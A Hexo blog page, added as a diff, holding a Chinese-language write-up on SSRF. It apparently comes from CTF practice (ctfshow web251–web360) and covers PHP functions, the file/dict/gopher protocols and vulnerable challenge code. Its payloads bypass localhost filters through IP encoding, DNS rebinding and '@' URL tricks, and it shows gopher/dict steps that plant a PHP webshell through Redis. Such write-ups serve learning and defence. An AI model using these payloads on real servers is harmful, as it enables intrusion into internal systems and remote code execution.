@@ -1,0 +1,173 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="userq"><meta name="renderer" content="webkit"><meta name="copyright" content="userq"><meta name="keywords" content="MyBlog"><meta name="description" content="MyBlog"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>SSRF · Mr.cheng's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MyBlog" type="application/atom+xml">
+</head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">userq</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//1768161086.github.io/" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.cheng's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">SSRF</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2025-03-10</span></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h3 id="SSRF基础"><a href="#SSRF基础" class="headerlink" title="SSRF基础"></a>SSRF基础</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<h3 id="相关函数和类"><a href="#相关函数和类" class="headerlink" title="相关函数和类"></a><strong>相关函数和类</strong></h3><p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=gethostbyname&spm=1001.2101.3001.7020">gethostbyname</a>() 返回主机名 hostname 对应的 IPv4 互联网地址。</p>
+<p>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中<br>readfile()：输出一个文件的内容<br>fsockopen()：打开一个网络连接或者一个Unix 套接字连接<br>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用<br>fopen()：打开一个文件文件或者 URL<br>PHP原生类SoapClient在触发反序列化时可导致SSRF</p>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a><strong>利用方式</strong></h3><p>1.让服务端去访问相应的网址</p>
+<p>2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</p>
+<p>3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</p>
+<p>4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</p>
+<p>5.攻击内网应用程序（利用跨协议通信技术）</p>
+<p>6.判断内网主机是否存活：方法是访问看是否有端口开放</p>
+<p>7.DoS攻击（请求大文件，始终保持连接keep-alive always）</p>
+<h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><p>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</p>
+<p>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shellhttp&#x2F;s协议：探测内网主机存活</p>
+<h3 id="Ⅰ、SSRF攻击点"><a href="#Ⅰ、SSRF攻击点" class="headerlink" title="Ⅰ、SSRF攻击点"></a>Ⅰ、SSRF攻击点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$ch=curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>curl_init()</code>：初始curl会话</li>
+<li><code>curl_setopt()</code>：会话设置</li>
+<li><code>curl_exec()</code>：执行curl会话,获取内容</li>
+<li><code>curl_close()</code>：会话关闭</li>
+</ul>
+<h3 id="Ⅱ、gopher协议"><a href="#Ⅱ、gopher协议" class="headerlink" title="Ⅱ、gopher协议"></a>Ⅱ、gopher协议</h3><p>通过gopher协议，将请求体用url编码后<strong>加上任意字符</strong>,<em>一般是下划线</em>，接上gopher的url即可执行GET、POST请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://ip:port/_[stream]</span><br></pre></td></tr></table></figure>
+
+<h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">post: url=http://127.0.0.1/flag.php</span><br><span class="line">或者使用 file 伪协议去读取文件</span><br><span class="line">post: url=file:///var/www/html/index.php 查看源码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><p>绕过local host和127.0.0.1</p>
+<p>payload:ip地址<strong>进制转换</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">十进制整数：url=http://2130706433/flag.php</span><br><span class="line">十六进制：url=http://0x7F.0.0.1/flag.php</span><br><span class="line">八进制：url=http://0177.0.0.1/flag.php</span><br><span class="line">十六进制整数：url=http://0x7F000001/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>other</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">缺省模式：127.0.0.1写成127.1</span><br><span class="line">CIDR：url=http://127.127.127.127/flag.php或者http://127.255.255.254/flag.php</span><br><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="web354-过滤01"><a href="#web354-过滤01" class="headerlink" title="web354-过滤01"></a>web354-过滤01</h4><p>在自己的域名中添加一条A记录指向 127.0.0.1</p>
+<p>或者使用 <code>http://sudo.cc</code>这个域名就是指向127.0.0.1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://sudo.cc/flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="web357-在线DNS重绑定"><a href="#web357-在线DNS重绑定" class="headerlink" title="web357-在线DNS重绑定)"></a>web357-在线<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">DNS重绑定</a>)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">$url=$_POST[&#x27;url&#x27;]; </span><br><span class="line">$x=parse_url($url); </span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123; </span><br><span class="line">$ip = gethostbyname($x[&#x27;host&#x27;]); </span><br><span class="line">echo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br&gt;&#x27;; </span><br><span class="line">if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123; </span><br><span class="line">    die(&#x27;ip!&#x27;); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo file_get_contents($_POST[&#x27;url&#x27;]); </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    die(&#x27;scheme&#x27;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>函数解析：</p>
+<p>gethostbyname() 返回主机名 hostname 对应的 IPv4 互联网地址。</p>
+<p>FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）</p>
+<p>FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）</p>
+<p>FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）</p>
+<p>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</p>
+<p>不能有内网ip，所以填一个公网ip:1.1.1.23</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://7f000001.01010117.rbndr.us/flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">$url=$_POST[&#x27;url&#x27;]; </span><br><span class="line">$x=parse_url($url); </span><br><span class="line">if(preg_match(&#x27;/^http:\/\/ctf\..*show$/i&#x27;,$url))&#123; </span><br><span class="line">    echo file_get_contents($url); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正则表达式的意思是以<a target="_blank" rel="noopener" href="http://ctf.开头,以show结尾./">http://ctf.开头，以show结尾。</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure>
+
+<h2 id="web359利用gopher无密码注入mysql"><a href="#web359利用gopher无密码注入mysql" class="headerlink" title="web359利用gopher无密码注入mysql"></a>web359利用gopher无密码注入mysql</h2><p>登陆界面找到一个隐藏的攻击点:type:’hidden’对其进行SSRF攻击</p>
+<p>详细请看另一篇文章</p>
+<p>将 _ 下划线后面的内容再进行一次 url 编码（防止出现特殊字符，后端 curl 接收到参数后会默认解码一次）</p>
+<p>抓包后将编码出来的数据（尾端去除%0a）以post方式传入returl,访问上传的文件执行命令获得flag</p>
+<h2 id="web360-打redis"><a href="#web360-打redis" class="headerlink" title="web360-打redis"></a>web360-打redis</h2><p>Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库</p>
+<p>手动尝试：</p>
+<p>url传入dict:&#x2F;&#x2F;127.0.0.1:6379</p>
+<p>dict探测 redis 默认端口是否存活：返回+OK 说明redis接收到了</p>
+<p>设置本地数据库存放地址：可以看到返回一个+OK</p>
+<p>使用上述方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit redis</span><br></pre></td></tr></table></figure>
+
+<p> 传入一句话木马，默认生成shell.php文件</p>
+<p>需要把 _ 后边的字符串再进行一次 url 编码，post传入url</p>
+<p>最后访问shell.php</p>
+<p>另一种方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=dict://127.0.0.1:6379/config:set:dbfilename:shell.php</span><br></pre></td></tr></table></figure>
+
+<p>被过滤可用十六进制绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=dict://127.0.0.1:set:shell:&quot;&quot;</span><br></pre></td></tr></table></figure>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://1768161086.github,io">userq</a></p><p> <span>Link:  </span><a href="http://1768161086.github,io/2025/03/10/SSRF/">http://1768161086.github,io/2025/03/10/SSRF/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2025/03/10/php%E6%BC%8F%E6%B4%9E/" title="php漏洞"><span>< PreviousPost</span><br><span class="prevTitle">php漏洞</span></a><a class="nextSlogan" href="/2025/03/07/SSTI/" title="SSTI"><span>NextPost ></span><br><span class="nextTitle">SSTI</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">SSRF基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E5%92%8C%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">相关函数和类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.</span> <span class="toc-text">相关协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%85%A0%E3%80%81SSRF%E6%94%BB%E5%87%BB%E7%82%B9"><span class="toc-number">5.</span> <span class="toc-text">Ⅰ、SSRF攻击点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%85%A1%E3%80%81gopher%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.</span> <span class="toc-text">Ⅱ、gopher协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web251"><span class="toc-number"></span> <span class="toc-text">web251</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web253"><span class="toc-number"></span> <span class="toc-text">web253</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#web354-%E8%BF%87%E6%BB%A401"><span class="toc-number">0.1.</span> <span class="toc-text">web354-过滤01</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web357-%E5%9C%A8%E7%BA%BFDNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number"></span> <span class="toc-text">web357-在线DNS重绑定)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web358"><span class="toc-number"></span> <span class="toc-text">web358</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web359%E5%88%A9%E7%94%A8gopher%E6%97%A0%E5%AF%86%E7%A0%81%E6%B3%A8%E5%85%A5mysql"><span class="toc-number"></span> <span class="toc-text">web359利用gopher无密码注入mysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web360-%E6%89%93redis"><span class="toc-number"></span> <span class="toc-text">web360-打redis</span></a></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
